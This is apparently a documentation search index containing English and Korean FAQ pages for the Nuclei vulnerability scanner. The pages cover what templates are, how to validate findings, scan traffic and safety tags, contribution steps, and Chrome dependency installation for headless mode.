{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"","title":"Index"},{"location":"faq/nuclei/","text":"What is nuclei? Nuclei is a fast and customizable vulnerability scanner based on simple YAML-based templates . It has two components, 1) Nuclei engine - the core of the project allows scripting HTTP / DNS / Network / Headless / File protocols based checks in a very simple to read-and-write YAML-based format. 2) Nuclei templates - ready-to-use community-contributed vulnerability templates. What was the genesis behind nuclei? Traditional scanners always lacked the features to allow easy-to-write custom checks on top of their engine. And this is why we started developing Nuclei with a core focus on simplicity, modularity, and the ability to scan on many assets. We wanted something simple enough to be used by everyone while complex enough to integrate into the modern web with its intricacies. The features implemented in nuclei are tailored to allow very rapid prototyping of complex security checks. What modules does nuclei engine support? Nuclei engine supports the following type of modules. HTTP DNS TCP FILE What kind of scans can I perform with nuclei? Nuclei can be used to detect security vulnerabilities in Web Applications , Networks , DNS based misconfiguration, and Secrets scanning in source code or files on the local file system. How well-maintained is this project? The nuclei project is actively developed and maintained by the ProjectDiscovery team, and generally releases every 2 weeks. How can I support/contribute to this project? \ud83d\udc99 To help keep project momentum, we request everyone to write and share new templates with the community in the template project . Please help us maintain this public, ready to use, and up-to-date nuclei template repository. If you found an interesting/unique security issue using nuclei and want to share the process walk-through in the form of a blog, we are happy to publish your guest post on the ProjectDiscovery blog . I found results with nuclei. When should I report it? Wait a minute -- after nuclei detected a security issue, it's always advised to have a second look before reporting it. Here's a tip to confirm/validate the issues. How do I validate nuclei results? Once nuclei finds a result, and you have vulnerable target and template , rerun the template with -debug flag to inspect the output against the expected matcher defined in the template. In this way, you can confirm the identified vulnerability. How much traffic does nuclei generate? By default nuclei will make several thousand requests (both HTTP protocol and other services) against a single target when running all nuclei-templates . This stems from over 3500 nuclei templates in the [ template releases , with more added daily. As default, few templates listed here are excluded from default scans. Is it safe to run nuclei? We consider two factors in regards to calling nuclei \"safe\" - The traffic nuclei makes against the target website. The impact templates have on the target website. HTTP Traffic Nuclei usually makes fewer HTTP requests than the number of templates selected for a scan due to its intelligent request reduction. While some templates contain multiple requests, this rule generally holds true across most scan configurations. Safe Templates The nuclei templates project houses a variety of templates which perform fuzzing and other actions which may result in a DoS against the target system (see the list here ). To ensure these templates are not accidentally run, they are tagged and excluded them from the default scan. These templates can only be executed when explicitly invoked using the -itags option. What is nuclei's license? Nuclei is an open-source project distributed under the MIT License . I have more questions! \ud83d\ude4b Please join our Discord server , or contact us via Twitter . Missing dependencies in headless mode on Linux Headless mode on machines based on Linux (OS or containers, eg. Docker) might face runtime errors due to missing dependencies related to specific OS-shared libraries used by chrome binary. Usually, these errors can be fixed by pre-installing the browser on the specific distribution. Here is a list of the steps needed for the most common distributions. Ubuntu With snap: sudo snap install chromium Without snap: sudo apt update sudo snap refresh sudo apt install zip curl wget git sudo snap install golang --classic wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add - sudo sh -c 'echo \"deb http://dl.google.com/linux/chrome/deb/ stable main\" >> /etc/apt/sources.list.d/google.list' sudo apt update sudo apt install google-chrome-stable In case you are unable to install the browser, or want to install only the minimum required dependencies, run the following command: sudo apt-get install libnss3 libgconf-2-4 If you encounter an error similar to \"libnss3.so: cannot open shared object file: No such file or directory,\" try running the following command to install the dev version: sudo apt-get install libnss3-dev Error type examples: Error: Expected nil, but got: &errors.errorString{s:\"[launcher] Failed to launch the browser, the doc might help https://go-rod.github.io/#/compatibility?id=os: /root/.cache/rod/browser/chromium-1018003/chrome-linux/chrome: error while loading shared libraries: libnss3.so: cannot open shared object file: No such file or directory\\n\"} could not create browser Command '/usr/bin/chromium-browser' requires the chromium snap to be installed. Please install it with: snap install chromium","title":"Nuclei FAQ"},{"location":"faq/templates/","text":"What are nuclei templates? Nuclei templates are the core of the nuclei project. The templates contain the actual logic that is executed in order to detect various vulnerabilities. The project consists of several thousand ready-to-use community-contributed vulnerability templates. How can I write nuclei templates? We maintain a documentation guide for writing new and custom nuclei templates. We also have sample templates for various modules nuclei supports. Is writing nuclei templates useful? Performing security assessment of an application is time-consuming. It's always better and time-saving to automate steps whenever possible. Once you've found a security vulnerability, you can prepare a nuclei template by defining the required HTTP request to reproduce the issue, and test the same vulnerability across multiple hosts with ease. It's worth mentioning you write the template once and use it forever , as you don't need to manually test that specific vulnerability any longer. Here are few examples from the community making use of templates to automate the security findings. Reference https://dhiyaneshgeek.github.io/web/security/2021/02/19/exploiting-out-of-band-xxe/ https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning https://blog.melbadry9.xyz/dangling-dns/xyz-services/ddns-worksites https://blog.melbadry9.xyz/dangling-dns/aws/ddns-ec2-current-state https://blog.projectdiscovery.io/writing-nuclei-templates-for-wordpress-cves/ How do I run nuclei templates? Nuclei templates can be executed using a template name or with tags, using -templates ( -t ) and -tags flag, respectively. nuclei -tags cve -list target_urls.txt I want to contribute nuclei templates! \ud83d\ude01 You are always welcome to share your nuclei templates with the community. You can either open a GitHub issue with the template details or open a GitHub pull request with your nuclei templates. If you don't have a GitHub account, you can also make use of the discord server to share the template with us. I'm getting false-positive results! The nuclei template project is a community-contributed project . The ProjectDiscovery team manually reviews templates before merging them into the project. Still, there is a possibility that some templates with weak matchers will slip through the verification. This could produce false-positive results. Templates are only as good as their matchers. If you identified templates producing false positive/negative results, here are few steps that you can follow to fix them quickly. I found a template producing false positive or negative results, but I'm not sure if this is accurate. Direct message us on Twitter or Discord to confirm the validity of the template. I found a template producing false positive or negative result and I don't know how to fix it. Please open a GitHub issue with details, and we will work to address the problem and update the template. I found a template producing a false positive or negative result and I know how to fix it. Please open a GitHub pull request with fix. I'm not able to run all templates! The nuclei templates project houses a variety of templates which perform fuzzing and other actions which may result in a DoS against the target system (see the list here ). To ensure these templates are not accidentally run, they are tagged and excluded them from the default scan. These templates can be only executed when explicitly invoked using the -itags option. Templates exist on GitHub but are not running with nuclei? When you download or update nuclei templates using the nuclei binary, it downloads all the templates from the latest release . All templates added after the release exist in the master branch and are added to nuclei when a new template release is created.","title":"Templates FAQ"},{"location":"kr/","text":"","title":"Index"},{"location":"kr/faq/nuclei/","text":"Nuclei\ub294 \ubb34\uc5c7\uc778\uac00\uc694? Nuclei\ub294 \uac04\ub2e8\ud55c YAML \ud15c\ud50c\ub9bf\uc744 \uae30\ucd08\ub85c \ud55c \ube60\ub978 \ub9de\ucda4\ud615 \ucde8\uc57d\uc810 \uc2a4\uce90\ub108\uc785\ub2c8\ub2e4. 2\uac1c\uc758 \uc694\uc18c\ub85c \uad6c\uc131\ub429\ub2c8\ub2e4. 1) Nuclei engine - \uc27d\uac8c \uc77d\uace0 \uc4f8 \uc218 \uc788\ub294 YAML \uae30\ubc18 \ud615\uc2dd\uc73c\ub85c HTTP/DNS/\ub124\ud2b8\uc6cc\ud06c/\ud5e4\ub4dc\ub9ac\uc2a4/\ud30c\uc77c \ud504\ub85c\ud1a0\ucf5c \uae30\ubc18 \uac80\uc0ac\ub97c \uc2a4\ud06c\ub9bd\ud305\ud560 \uc218 \uc788\uac8c \ud569\ub2c8\ub2e4. 2) Nuclei templates - \uc989\uc2dc \uc0ac\uc6a9\ud560 \uc218 \uc788\ub294 \ucee4\ubba4\ub2c8\ud2f0\uc5d0\uc11c \uae30\uc5ec\ud574\uc900 \ucde8\uc57d\uc810 \ud15c\ud50c\ub9bf\uc785\ub2c8\ub2e4. \uc5b4\ub5bb\uac8c \uc2dc\uc791\ud558\uac8c \ub418\uc5c8\ub098\uc694? \uae30\uc874\uc758 \uc2a4\uce90\ub108\ub294 \uc5d4\uc9c4 \uc704\uc5d0 \uc4f0\uae30 \uc26c\uc6b4 \ub9de\ucda4\uc2dd \uac80\uc0ac\ub97c \ud5c8\uc6a9\ud558\ub294 \uae30\ub2a5\uc774 \ud56d\uc0c1 \ubd80\uc871\ud588\uc2b5\ub2c8\ub2e4. \uc774\uac83\uc774 \ub2e8\uc21c\uc131, \ubaa8\ub4c8\uc131, \uadf8\ub9ac\uace0 \ub9ce\uc740 \uc5d0\uc14b\ub4e4\uc744 \uc2a4\uce94\ud560 \uc218 \uc788\ub294 \ub2a5\ub825\uc5d0 \uc911\uc810\uc744 \ub450\uace0 Nuclei\ub97c \uac1c\ubc1c\ud558\uae30 \uc2dc\uc791\ud55c \uc774\uc720\uc785\ub2c8\ub2e4. \ub204\uad6c\ub098 \uc0ac\uc6a9\ud558\uae30\uc5d0 \uac04\ud3b8\ud558\uae30\ub3c4 \ud558\uace0 \ud604\ub300 \uc6f9\uc5d0 \ud1b5\ud569\ub420 \ub9cc\ud07c \ucda9\ubd84\ud788 \uc815\uad50\ud558\uae38 \uc6d0\ud588\uc2b5\ub2c8\ub2e4. Nuclei\uc758 \uae30\ub2a5\ub4e4\uc740 \ubcf5\uc7a1\ud55c \ubcf4\uc548 \uac80\uc0ac\ub97c \ub9e4\uc6b0 \ube60\ub974\uac8c \ud504\ub85c\ud1a0\ud0c0\uc785\ud654 \ud560 \uc218 \uc788\ub3c4\ub85d \uc870\uc815\ud588\uc2b5\ub2c8\ub2e4. \uc5b4\ub5a4 \ubaa8\ub4c8\uc744 \uc9c0\uc6d0\ud558\ub098\uc694? Nuclei\ub294 \ub2e4\uc74c\uacfc \uac19\uc740 \ubaa8\ub4c8\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. HTTP DNS TCP FILE Nuclei\ub97c \ud1b5\ud574 \uc5b4\ub5a4 \uc885\ub958\uc758 \uc2a4\uce94\uc744 \ud560 \uc218 \uc788\ub098\uc694? Nuclei\ub294 \ub85c\uceec \ud30c\uc77c \uc2dc\uc2a4\ud15c\uc758 \uc18c\uc2a4 \ucf54\ub4dc\ub098 \ud30c\uc77c\ub4e4\uc5d0 \uc788\ub294 \uc6f9 \uc5b4\ud50c\ub9ac\ucf00\uc774\uc158 , \ub124\ud2b8\uc6cc\ud06c , \uc798\ubabb\ub41c \uad6c\uc131 \uae30\ubc18\uc758 DNS , **\ube44\ubc00\uc2a4\ub7ec\uc6b4 \uc2a4\uce90\ub2dd**\ub4f1\uc5d0\uc11c \uc0dd\uae30\ub294 \ubcf4\uc548 \ucde8\uc57d\uc810\uc744 \ud0d0\uc9c0 \ud558\ub294\ub370 \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc5b4\ub5bb\uac8c \uc774 \ud504\ub85c\uc81d\ud2b8\ub294 \uc5b4\ub5bb\uac8c \uc720\uc9c0\ub418\uace0 \uc788\ub098\uc694? Nuclei \ud504\ub85c\uc81c\ud2b8\ub294 \ud604\uc7ac ProjectDiscovery \ud300\uc5d0 \uc758\ud574\uc11c \uac1c\ubc1c \ubc0f \uc720\uc9c0\ub418\uace0 \uc788\uc2b5\ub2c8\ub2e4. \uadf8\ub9ac\uace0 \uc77c\ubc18\uc801\uc73c\ub85c \ub9e4 2\uc8fc\ub9c8\ub2e4 \ub9b4\ub9ac\uc988\ub97c \uc9c4\ud589\ud558\uace0 \uc788\uc2b5\ub2c8\ub2e4. \uc5b4\ub5bb\uac8c \uc774 \ud504\ub85c\uc81d\ud2b8\uc5d0 \uc9c0\uc6d0/\uae30\uc5ec \ud560 \uc218 \uc788\ub098\uc694? \ud83d\udc99 \ud504\ub85c\uc81d\ud2b8\uc758 \ubaa8\uba58\ud140\uc744 \uc720\uc9c0\ud558\uae30 \uc704\ud574\uc11c, \ubaa8\ub450\uac00 template project \uc5d0\uc11c \uc0c8\ub85c\uc6b4 \ud15c\ud50c\ub9bf\uc744 \uc0dd\uc131\ud558\uace0 \ucee4\ubba4\ub2c8\ud2f0\uc5d0 \uacf5\uc720\ud574\uc8fc\uae38 \uc6d0\ud569\ub2c8\ub2e4. Nuclei \ud15c\ud50c\ub9bf \uc800\uc7a5\uc18c\uac00 \uacf5\uac1c\uc801\uc774\uace0, \uc989\uc2dc \uc0ac\uc6a9\uac00\ub2a5 \ud558\uace0, \ucd5c\uc2e0\uc744 \uc720\uc9c0\ud560 \uc218 \uc788\ub3c4\ub85d \ub3c4\uc640\uc8fc\uc138\uc694. Nuclei\ub97c \uc0ac\uc6a9\ud558\uba70 \ucc3e\uc740 \ud765\ubbf8\ub86d\uac70\ub098 \ud2b9\ubcc4\ud55c \ubcf4\uc548 \ubb38\uc81c\ub97c \ucc3e\uc558\uace0, \uc774 \uacfc\uc815 \uc804\uccb4\ub97c \ube14\ub85c\uadf8\uc758 \ud615\ud0dc\ub85c \uacf5\uc720\ud558\uace0\uc790 \ud55c\ub2e4\uba74 ProjectDiscovery blog \uc5d0 \uac8c\uc2a4\ud2b8 \uac8c\uc2dc\ubb3c\ub85c \uc62c\ub824\uc8fc\uc2dc\uba74 \uac10\uc0ac\ud558\uaca0\uc2b5\ub2c8\ub2e4. Nuclei\uc5d0\uc11c \uacb0\uacfc\ub97c \uc5bb\uc5c8\uc2b5\ub2c8\ub2e4. \uc5b8\uc81c \uc774\ub97c \uc2e0\uace0(Report)\ud574\uc57c\ud558\ub098\uc694? \uc7a0\uc2dc\ub9cc\uc694 -- Nuclei\uc5d0\uc11c \ubcf4\uc548 \ubb38\uc81c\ub97c \ucc3e\uc740 \uc774\ud6c4\uc5d0 \ud56d\uc0c1 \uc774\ub97c \uc2e0\uace0\ud558\uae30 \uc774\uc804\uc5d0 \ub2e4\uc2dc \uc0b4\ud3b4 \ubcf4\ub294 \uac83\uc774 \uc88b\uc2b5\ub2c8\ub2e4. \ub2e4\uc74c\uc740 \ubb38\uc81c\ub97c \ud655\uc778/\uac80\uc99d\ud558\uae30 \uc704\ud55c \ud301\uc785\ub2c8\ub2e4. \uc5b4\ub5bb\uac8c Nuclei\uc758 \uacb0\uacfc\ub97c \uac80\uc99d\ud558\ub098\uc694? Nuclei\ub97c \ud1b5\ud574 \uacb0\uacfc\ub97c \ud68d\ub4dd\ud558\uace0, \ucde8\uc57d\ud55c \ub300\uc0c1\uacfc \ud15c\ud50c\ub9bf\uc744 \uc54c\uac8c \ub418\uba74, -debug \ud50c\ub798\uadf8\uc640 \ud568\uaed8 \ud15c\ud50c\ub9bf\uc744 \ub2e4\uc2dc \uc2e4\ud589\ud558\uc5ec \ud15c\ud50c\ub9bf\uc5d0 \uc815\uc758\ub41c \uc608\uc0c1 \uacb0\uacfc\uc640 \ube44\uad50\ud558\uc5ec \ucd9c\ub825\uc744 \uac80\uc0ac\ud569\ub2c8\ub2e4. \uc774\ub7ec\ud55c \ubc29\uc2dd\uc744 \ud1b5\ud574\uc11c, \uc2dd\ubcc4\ub41c \ucde8\uc57d\uc810\uc744 \ud655\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Nuclei\uac00 \uc0dd\uc131\ud558\ub294 \ud2b8\ub798\ud53d\uc740 \uc5bc\ub9c8\ub098 \ub9ce\uc740\uac00\uc694? \uae30\ubcf8\uc801\uc73c\ub85c **\ubaa8\ub4e0 nuclei-templates**\uc744 \uc2e4\ud589\ud560 \ub54c \ud55c \ub300\uc0c1\uc5d0\uac8c (HTTP \ud504\ub85c\ud1a0\ucf5c \uacfc \ub2e4\ub978 \uc11c\ube44\uc2a4 \ubaa8\ub450) \uc218 \ucc9c\uac1c\uc758 \uc694\uccad\uc744 \uc0dd\uc131\ud569\ub2c8\ub2e4. \ub9e4\uc77c \ucd94\uac00\ub418\ub294 3500\uac1c\uc758 Nuclei \ud15c\ud50c\ub9bf\uc5d0\uc11c \ube44\ub86f\ub429\ub2c8\ub2e4. \uae30\ubcf8\uc801\uc73c\ub85c \uc774 \uacf3 \uc5d0 \uc788\ub294 \uc77c\ubd80 \ud15c\ud50c\ub9bf\uc740 \uae30\ubcf8 \uac80\uc0c9\uc5d0\uc11c \uc81c\uc678\ub429\ub2c8\ub2e4. Nuclei\ub97c \uc2e4\ud589\ud558\ub294 \uac83\uc740 \uc548\uc804\ud55c\uac00\uc694? Nuclei\uc5d0\uc11c \"\uc548\uc804\" \ud558\ub2e4\uace0 \ub9d0\ud558\uae30 \uc704\ud574\uc11c \ub450 \uac00\uc9c0\ub97c \uace0\ub824\ud569\ub2c8\ub2e4. \ud575\uc774 \ub300\uc0c1 \uc0ac\uc774\ud2b8\uc5d0 \uc0dd\uc131\ud55c \ud2b8\ub798\ud53d . \ud15c\ud50c\ub9bf\uc774 \uc0ac\uc774\ud2b8\uc5d0 \ubbf8\uce58\ub294 \uc601\ud5a5 HTTP \ud2b8\ub798\ud53d Nuclei\ub294 \uc9c0\ub2a5\uc801\uc778 \uc694\uccad \uac10\uc18c \ub54c\ubb38\uc5d0 \ud56d\uc0c1 \uc120\ud0dd\ub41c \ud15c\ud50c\ub9bf \uc218\ubcf4\ub2e4 \uc801\uc740 \uc218\uc758 HTTP \uc694\uccad\uc744 \uc0dd\uc131\ud569\ub2c8\ub2e4. \uc77c\ubd80 \ud15c\ud50c\ub9bf\uc5d0\ub294 \ub2e4\uc218\uc758 \uc694\uccad\uc774 \ud3ec\ud568\ub418\uc5b4 \uc788\uc9c0\ub9cc, \uc774 \ub8f0\uc740 \uc77c\ubc18\uc801\uc73c\ub85c \ub300\ubd80\ubd84\uc758 \uc2a4\uce94 \uc124\uc815\uc5d0 \uc801\uc6a9\ub429\ub2c8\ub2e4. \uc548\uc804\ud55c \ud15c\ud50c\ub9bf Nuclei \ud15c\ud50c\ub9bf\uc5d0\ub294 \ud37c\uc9c0 \ubc0f \ub300\uc0c1 \uc2dc\uc2a4\ud15c\uc5d0 DoS\ub97c \ucd08\ub798\ud560 \uc218 \uc788\ub294 \ub2e4\uc591\ud55c \ud15c\ud50c\ub9bf\uc774 \ud3ec\ud568\ub418\uc5b4 \uc788\uc2b5\ub2c8\ub2e4( \ubaa9\ub85d \ucc38\uc870). \uc774\ub7ec\ud55c \ud15c\ud50c\ub9bf\ub4e4\uc774 \uc2e4\uc218\ub85c \uc2e4\ud589\ub418\uc9c0 \uc54a\ub3c4\ub85d \ud15c\ud50c\ub9bf\uc5d0 \ud0dc\uadf8\ub97c \ub2ec\uace0 \uae30\ubcf8 \uc2a4\uce94\uc5d0\uc11c \uc81c\uc678\ud569\ub2c8\ub2e4. \uc774\ub7f0 \ud15c\ud50c\ub9bf\ub4e4\uc740 -itags \uc635\uc158\uc744 \uc0ac\uc6a9\ud55c \uba85\uc2dc\uc801\uc778 \uacbd\uc6b0\uc5d0\ub9cc \uc2e4\ud589\ub429\ub2c8\ub2e4. Nuclei \ub77c\uc774\uc120\uc2a4\ub294 \ubb34\uc5c7\uc778\uac00\uc694? Nuclei MIT License \ub97c \uac00\uc9c4 \uc624\ud508\uc18c\uc2a4 \ud504\ub85c\uc81d\ud2b8\uc785\ub2c8\ub2e4. \ub354 \ub9ce\uc740 \uc9c8\ubb38\uc744 \ud558\uace0 \uc2f6\uc2b5\ub2c8\ub2e4! \ud83d\ude4b Discord server \uc5d0 \ucc38\uc5ec\ud558\uc2dc\uac70\ub098 Twitter \ub85c \uc5f0\ub77d\uc744 \ubd80\ud0c1\ub4dc\ub9bd\ub2c8\ub2e4.","title":"Nuclei"},{"location":"kr/faq/templates/","text":"Nuclei \ud15c\ud50c\ub9bf\uc774 \ubb54\uac00\uc694? Nuclei templates \ub294 Nuclei \ud504\ub85c\uc81d\ud2b8\uc758 \ud575\uc2ec\uc785\ub2c8\ub2e4. \ud15c\ud50c\ub9bf\ub4e4\uc740 \ub2e4\uc591\ud55c \ucde8\uc57d\uc810\uc744 \ucc3e\uc544\ub0b4\uae30 \uc704\ud574 \uc2e4\ud589\ub418\ub294 \ud575\uc2ec \ub85c\uc9c1\uc744 \ud3ec\ud568\ud569\ub2c8\ub2e4. \ud504\ub85c\uc81d\ud2b8\ub294 \uc218\ucc9c \uac1c**\uc758 \uc989\uc2dc \uc0ac\uc6a9\uac00\ub2a5\ud55c ** \ucee4\ubba4\ub2c8\ud2f0\uc5d0\uc11c \uae30\uc5ec\ud574\uc900 \ucde8\uc57d\uc810 \ud15c\ud50c\ub9bf\ub4e4\ub85c \uad6c\uc131\ub418\uc5b4 \uc788\uc2b5\ub2c8\ub2e4. \uc5b4\ub5bb\uac8c Nuclei \ud15c\ud50c\ub9bf\uc744 \uc7a5\uc131\ud560 \uc218 \uc788\ub098\uc694? Nuclei templates \uc744 \uc0c8\ub85c \uc791\uc131\ud558\uace0 \ucee4\uc2a4\ud140 \ud558\uae30 \uc704\ud55c \uac00\uc774\ub4dc \ub97c \uc720\uc9c0\ud558\uace0 \uc788\uc2b5\ub2c8\ub2e4. \ub610\ud55c, Nuclei\uac00 \uc9c0\uc6d0\ud558\ub294 \ub2e4\uc591\ud55c \ubaa8\ub4c8\ub4e4\uc5d0 \ub300\ud55c \uc0d8\ud50c \ud0ec\ud50c\ub9bf \ub3c4 \uc788\uc2b5\ub2c8\ub2e4. Nuclei \ud15c\ud50c\ub9bf\uc744 \uc791\uc131\ud558\ub294 \uac83\uc774 \uc720\uc6a9\ud55c\uac00\uc694? \ud55c \uc5b4\ud50c\ub9ac\ucf00\uc774\uc158\uc758 \ubcf4\uc548\uc744 \ud3c9\uac00\ud558\ub294 \uc77c\uc744 \ub9ce\uc740 \uc2dc\uac04\uc744 \uc18c\ubaa8\ud569\ub2c8\ub2e4. \uac00\ub2a5\ud560 \ub54c\ub9c8\ub2e4 \ub2e8\uacc4\ub97c \uc790\ub3d9\ud654 \ud558\ub294 \uac83\uc740 \uc5b8\uc81c\ub098 \uc2dc\uac04\uc774 \uc808\uc57d\ub418\uace0 \uc88b\uc740 \uac83\uc785\ub2c8\ub2e4. \ubcf4\uc548 \ucde8\uc57d\uc810\uc744 \ubc1c\uacac\ud558\uba74, \uadf8 \uc774\uc288\ub97c \uc7ac\ud604\ud558\uae30 \uc704\ud558\uc5ec \ud544\uc694\ud55c HTTP \uc694\uccad\uc744 \uc815\uc758\ud558\uc5ec Nuclei \ud15c\ud50c\ub9bf\uc744 \uc900\ube44\ud558\uace0, \uc774\ub97c \ud1b5\ud574 \uc27d\uac8c \uc5ec\ub7ec \ud638\uc2a4\ud2b8\uc5d0\uc11c \ub3d9\uc77c\ud55c \ucde8\uc57d\uc810\uc744 \ud14c\uc2a4\ud2b8\ud569\ub2c8\ub2e4. **\ud15c\ud50c\ub9bf\uc744 \ud55c \ubc88 \uc791\uc131\ud558\uc5ec \uc601\uc6d0\ud788 \uc0ac\uc6a9\ud558\ub294 \uac83**\uc740 \ub354 \uc774\uc0c1 \ucde8\uc57d\uc810 \ud14c\uc2a4\ud2b8\ub97c \uc218\ub3d9\uc73c\ub85c \ud560 \ud544\uc694\uac00 \uc5c6\uae30 \ub54c\ubb38\uc5d0 \ucda9\ubd84\ud788 \uac00\uce58\uc788\ub294 \uc77c\uc785\ub2c8\ub2e4. \ub2e4\uc74c\uc740 \ubcf4\uc548\uad00\ub828 \uacb0\uacfc\ub4e4\uc744 \uc790\ub3d9\ud654\ud558\uae30 \uc704\ud574 \ucee4\ubba4\ub2c8\ud2f0\uac00 \ud15c\ud50c\ub9bf\uc744 \uc0ac\uc6a9\ud55c \uc608\uc2dc\uc785\ub2c8\ub2e4. Reference https://dhiyaneshgeek.github.io/web/security/2021/02/19/exploiting-out-of-band-xxe/ https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning https://blog.melbadry9.xyz/dangling-dns/xyz-services/ddns-worksites https://blog.melbadry9.xyz/dangling-dns/aws/ddns-ec2-current-state https://blog.projectdiscovery.io/writing-nuclei-templates-for-wordpress-cves/ Nuclei \ud15c\ud50c\ub9bf\uc744 \uc5b4\ub5bb\uac8c \uc2e4\ud589\uc2dc\ud0ac \uc218 \uc788\ub098\uc694? Nuclei \ud15c\ud50c\ub9bf\uc740 \uc774\ub984\uacfc \ud0dc\uadf8\ub97c \ud1b5\ud574 (\uac01\uac01 -templates ( -t )\ub098 -tags \ud50c\ub798\uadf8) \uc2e4\ud589\uc2dc\ud0ac \uc218 \uc788\uc2b5\ub2c8\ub2e4. nuclei -tags cve -list target_urls.txt Nuclei \ud15c\ud50c\ub9bf\uc5d0 \uae30\uc5ec\ud558\uace0 \uc2f6\uc5b4\uc694! \ud83d\ude01 Nuclei \ud15c\ud50c\ub9bf\uc744 \ucee4\ubba4\ub2c8\ud2f0\uc5d0 \uacf5\uc720\ud574\uc8fc\uc2dc\ub294 \uac83\uc740 \uc5b8\uc81c\ub098 \ud658\uc601\ud569\ub2c8\ub2e4. \ud15c\ud50c\ub9bf\uc758 \uc138\ubd80\uc0ac\ud56d\uacfc \ud568\uaed8 GitHub issue \ub97c \uc5f4\uac70\ub098 \ubcf8\uc778\ub9cc\uc758 Nuclei \ud15c\ud50c\ub9bf\uc744 \ud3ec\ud568\ud558\uc5ec GitHub pull request \uc744 \ubcf4\ub0b4\uc8fc\uc138\uc694. \ub9cc\uc57d Github \uacc4\uc815\uc774 \uc5c6\ub2e4\uba74, discord server \ub97c \uc774\uc6a9\ud558\uc154\ub3c4 \ub429\ub2c8\ub2e4. \uc798\ubabb\ub41c \uacb0\uacfc\ub97c \uc5bb\uc5c8\uc5b4\uc694! Nuclei \ud15c\ud50c\ub9bf \ud504\ub85c\uc81d\ud2b8\ub294 \ucee4\ubba4\ub2c8\ud2f0\uc5d0\uc11c \uae30\uc5ec\ud558\ub294 \ud504\ub85c\uc81d\ud2b8**\uc785\ub2c8\ub2e4. ProjectDiscovery \ud300\uc740 \ud15c\ud50c\ub9bf\uc774 \ubcd1\ud569\ub418\uae30 \uc804\uc5d0 \uc218\ub3d9\uc801\uc73c\ub85c \ud15c\ud50c\ub9bf\ub4e4\uc744 \ub9ac\ubdf0\ud569\ub2c8\ub2e4. \uadf8\ub7fc\uc5d0\ub3c4, \uc57d\ud55c matchers\ub97c \uac00\uc9c4 \uc77c\ubd80 \ud15c\ud50c\ub9bf\ub4e4\uc740 \ud1b5\uacfc\ud560 \uac00\ub2a5\uc131\uc774 \uc788\uc2b5\ub2c8\ub2e4. \uc774\ub294 \uc798\ubabb\ub41c \uacb0\uacfc\ub97c \uc0dd\uc131\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. **\ud15c\ud50c\ub9bf\uc740 \uadf8 matchers\ub9cc\ud07c\uc758 \uc131\ub2a5\uc744 \ub0c5\ub2c8\ub2e4. \ub9cc\uc57d \ud15c\ud50c\ub9bf\uc774 \uac70\uc9d3\ub41c \uacb0\uacfc\ub97c \uc0dd\uc0c1\ud558\ub294\uc9c0 \ud655\uc778\ud558\uace0 \uc2f6\ub2e4\uba74, \ube60\ub974\uac8c \uace0\uce58\uae30 \uc704\ud55c \ub2e4\uc74c\uc758 \uba87 \uac00\uc9c0 \ub530\ub77c\ud560 \uc218 \uc788\ub294 \ub2e8\uacc4\ub4e4\uc774 \uc788\uc2b5\ub2c8\ub2e4. \uc798\ubabb\ub41c \uacb0\uacfc\ub97c \ucc3e\uc558\ub294\ub370, \uc815\ud655\ud55c\uc9c0 \ubaa8\ub974\uaca0\uc5b4\uc694. Twitter \ud639\uc740 Discord \uc758 DM\uc744 \ud1b5\ud574 \ud15c\ud50c\ub9bf\uc758 \ud0c0\ub2f9\uc131\uc744 \ud655\uc778\ud569\ub2c8\ub2e4. \uc798\ubabb\ub41c \uacb0\uacfc\ub97c \ucc3e\uc558\ub294\ub370, \uc5b4\ub5bb\uac8c \uace0\uce60 \uc9c0 \ubaa8\ub974\uaca0\uc5b4\uc694. GitHub issue \ub97c \uc138\ubd80\uc0ac\ud56d\uacfc \ud568\uaed8 \ub0a8\uaca8\uc8fc\uc138\uc694. \ubaa8\ub450\uac00 \ubb38\uc81c\ub97c \ud574\uacb0\ud558\uace0 \uc5c5\ub370\uc774\ud2b8 \ud558\uae30 \uc704\ud574 \uc77c\ud560 \uac83\uc785\ub2c8\ub2e4. \uc798\ubabb\ub41c \uacb0\uacfc\ub97c \ucc3e\ub294 \ud15c\ud50c\ub9bf\uc744 \ucc3e\uace0, \uc5b4\ub5bb\uac8c \uace0\uce58\ub294 \uc9c0 \uc54c\uc544\uc694. \uc218\uc815\ud55c \ub0b4\uc5ed\uc744 GitHub pull request \ub97c \ud1b5\ud574 \uc804\ub2ec\ud574\uc8fc\uc138\uc694. \ubaa8\ub4e0 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\uc2dc\ud0ac \uc218 \uc5c6\uc5b4\uc694! Nuclei \ud15c\ud50c\ub9bf\uc5d0\ub294 \ud37c\uc9c0 \ubc0f \ub300\uc0c1 \uc2dc\uc2a4\ud15c\uc5d0 DoS\ub97c \ucd08\ub798\ud560 \uc218 \uc788\ub294 \ub2e4\uc591\ud55c \ud15c\ud50c\ub9bf\uc774 \ud3ec\ud568\ub418\uc5b4 \uc788\uc2b5\ub2c8\ub2e4( \ubaa9\ub85d \ucc38\uc870). \uc774\ub7ec\ud55c \ud15c\ud50c\ub9bf\ub4e4\uc774 \uc2e4\uc218\ub85c \uc2e4\ud589\ub418\uc9c0 \uc54a\ub3c4\ub85d \ud15c\ud50c\ub9bf\uc5d0 \ud0dc\uadf8\ub97c \ub2ec\uace0 \uae30\ubcf8 \uc2a4\uce94\uc5d0\uc11c \uc81c\uc678\ud569\ub2c8\ub2e4. \uc774\ub7f0 \ud15c\ud50c\ub9bf\ub4e4\uc740 -itags \uc635\uc158\uc744 \uc0ac\uc6a9\ud55c \uba85\uc2dc\uc801\uc778 \uacbd\uc6b0\uc5d0\ub9cc \uc2e4\ud589\ub429\ub2c8\ub2e4. Github\uc5d0 \uc788\ub294 \ud15c\ud50c\ub9bf\uc774\uc9c0\ub9cc Nuclei\ub85c \uc2e4\ud589\ub418\uc9c0 \uc54a\uc544\uc694. Nuclei \uc2e4\ud589\ud30c\uc77c\ub85c \ud15c\ud50c\ub9bf\uc744 \ub2e4\uc6b4\ubc1b\uac70\ub098 